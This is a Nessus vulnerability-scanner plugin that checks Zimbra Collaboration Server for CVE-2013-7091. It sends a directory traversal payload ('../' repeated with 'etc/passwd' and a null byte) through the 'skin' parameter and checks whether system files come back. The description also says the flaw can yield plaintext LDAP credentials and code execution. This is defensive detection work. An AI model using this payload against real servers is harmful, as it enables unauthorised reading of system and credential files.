#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(72585);
  script_version("$Revision: 1.8 $");
  script_cvs_date("$Date: 2016/11/23 20:52:20 $");

  script_cve_id("CVE-2013-7091");
  script_bugtraq_id(64149);
  script_osvdb_id(100747);
  script_xref(name:"EDB-ID", value:"30085");
  script_xref(name:"EDB-ID", value:"30472");

  script_name(english:"Zimbra Collaboration Server skin Parameter Traversal Local File Inclusion");
  script_summary(english:"Tries to read a local file");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server contains a script that is affected by a file
disclosure vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The Zimbra Collaboration Server installed on the remote host is
affected by a file disclosure vulnerability because it fails to properly
sanitize user-supplied input to the 'skin' parameter of
'/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz'.
This vulnerability could allow a remote, unauthenticated attacker to
view or execute arbitrary files by forming a request containing
directory traversal sequences.

Note that this issue can be leveraged to execute arbitrary code by
obtaining LDAP credentials stored in plaintext and accessing the
'/service/admin/soap' API."
  );
  # http://www.zimbra.com/forums/announcements/67236-security-guidance-reported-0day-exploit.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?d695723d");
  script_set_attribute(attribute:"see_also", value:"http://files2.zimbra.com/website/docs/7.2/ZCS_Patch_7_2_2_r1.pdf");
  script_set_attribute(attribute:"see_also", value:"http://files2.zimbra.com/website/docs/8.0/ZCS_Patch_8_0_2_r1.pdf");
  script_set_attribute(attribute:"solution", value:"Upgrade to the version 7.2.2 patch 1 / 8.0.2 patch 1 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Zimbra iCollaboration Server LFI");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Zimbra Collaboration Server LFI');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/12/06");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/02/19");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/02/19");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:zimbra:collaboration_suite");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2014-2016 Tenable Network Security, Inc.");

  script_dependencies("zimbra_web_detect.nbin");
  script_require_keys("www/zimbra_zcs");
  script_require_ports("Services/www", 7071);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("gunzip.inc");

port = get_http_port(default:7071);

install = get_install_from_kb(
  appname      : "zimbra_zcs",
  port         : port,
  exit_on_fail : TRUE
);

dir = install["dir"];
install_url = build_url(port:port, qs:dir);

file = 'etc/passwd';
file_pat = '^a\\.root=".*:0:[01]:';

# Get appVers parameter
res = http_send_recv3(
  method : "GET",
  port   : port,
  item   : dir + "/",
  exit_on_fail : TRUE,
  follow_redirect : 2
);

item = eregmatch(pattern:'appVers\\s+ = "([0-9]+)"', string:res[2]);
if (!isnull(item)) v = item[1];
# Fallback to value from PoC, this condition should never be reached
else v = '091214175450';

attack =  mult_str(str:"../", nb:12);
url = "res/I18nMsg,AjxMsg,ZMsg,ZaMsg,ZabMsg,AjxKeys.js.zgz?v=" +
  v + "&skin=" + attack + file + "%00";

res = http_send_recv3(
  method    : "GET",
  item      : dir + "/" + url,
  port         : port,
  exit_on_fail : TRUE
);
body = gunzip(res[2]);
if (isnull(body)) audit(AUDIT_RESP_BAD, port);

if (egrep(pattern:file_pat, string:body))
{
  if (report_verbosity > 0)
  {
    snip =  crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);
    report =
      '\n' + 'Nessus was able to exploit the issue to retrieve the contents of '+
      '\n' + "'" + file + "'" + ' using the following request :' +
      '\n' +
      '\n' + install_url + url +
      '\n';

    if (report_verbosity > 1)
    {
      output = strstr(body, "a.root=");
      if (isnull(output)) output = chomp(body);

      if (
        !defined_func("nasl_level") ||
        nasl_level() < 5200 ||
        !isnull(get_preference("sc_version"))
      )
      {
        report +=
          '\n' + 'This produced the following truncated output :' +
          '\n' + snip +
          '\n' + beginning_of_response(resp:output, max_lines:'10') +
          '\n' + snip +
          '\n';
        security_warning(port:port, extra:report);
      }
      else
      {
        output = beginning_of_response(resp:output, max_lines:'30');
        # Sanitize file names
        if ("/" >< file) file = ereg_replace(
          pattern:"^.+/([^/]+)$", replace:"\1", string:file);
        report +=
          '\n' + 'Attached is a copy of the response' + '\n';
        attachments = make_list();
        attachments[0] = make_array();
        attachments[0]["type"] = "text/plain";
        attachments[0]["name"] = file;
        attachments[0]["value"] = output;
        security_report_with_attachments(
          port  : port,
          level : 2,
          extra : report,
          attachments : attachments
        );
      }
    }
    else security_warning(port:port, extra:report);
  }
  else security_warning(port:port);
  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, "Zimbra Collaboration Server", install_url);
